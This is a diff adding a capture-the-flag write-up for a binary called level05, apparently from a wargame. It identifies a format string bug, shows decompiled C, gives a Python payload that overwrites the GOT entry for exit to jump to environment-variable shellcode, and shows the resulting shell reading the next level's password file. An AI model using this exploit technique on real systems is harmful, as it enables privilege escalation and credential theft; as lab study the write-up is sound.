@@ -1,0 +1,70 @@
+# level05
+
+## Testing the binary
+
+```sh
+$ ./level05
+asd;jkasjdkasdjlkasjdklasdjklasjdkasdjlkasjdlka
+asd;jkasjdkasdjlkasjdklasdjklasjdkasdjlkasjdlka
+$ ./level05
+%s
+Segmentation fault (core dumped)
+```
+
+It seems like there is a format string vulnerability, let's investigate.
+
+## Diassembly
+
+```c
+int main(int argc)
+{
+    char buffer[0x64];
+    fgets(&buffer, 0x64, stdin);
+    while (true)
+    {
+        int i = 0;
+        while (buffer[i] != 0) {
+            if (buffer[i] > 0x40 && buffer[i] <= 0x5a) {
+                buffer[i] = (buffer[i] ^ 0x20); // lowercase
+            }
+            i++;
+        }
+    }
+    printf(&buffer);
+    exit(0);
+}
+```
+
+## Exploitation
+
+Since there are no other functions in the binary, we can't overwrite `EIP` to jump to another function. However, we can overwrite the `exit` function pointer in the GOT to execute arbitrary code.
+
+This arbitrary code can be just a shellcode that `execve` with `/bin/sh` that we pass in an environment variable.
+
+1. Get the address of `exit` in the GOT -> `0x080497e0`
+2. Get the address of the `SHELLCODE` environment variable -> `0xffffd88e`
+3. Overwrite the `exit` function pointer with the address of the `SHELLCODE` environment variable
+
+```py
+import struct
+from base64 import b64encode
+
+global_addr = 0x080497e0
+
+payload = b""
+payload += struct.pack("I", global_addr)
+payload += struct.pack("I", global_addr+2)
+payload += ("%{}x".format(55438-8)).encode() # lower bytes of the shellcode address
+payload += "%10$n".encode() # offset to the two bytes of the exit function pointer
+payload += ("%{}x".format(65535-55438)).encode() # higher bytes of the shellcode address
+payload += "%11$n".encode() # offset to the two bytes of the exit function pointer
+
+print(b64encode(payload).decode())
+```
+
+```sh
+id
+uid=1005(level05) gid=1005(level05) euid=1006(level06) egid=100(users) groups=1006(level06),100(users),1005(level05)
+cat /home/users/level06/.pass
+h4GtNnaMs2kZFN92ymTr2DcJHAzMfzLW25Ep59mq
+```
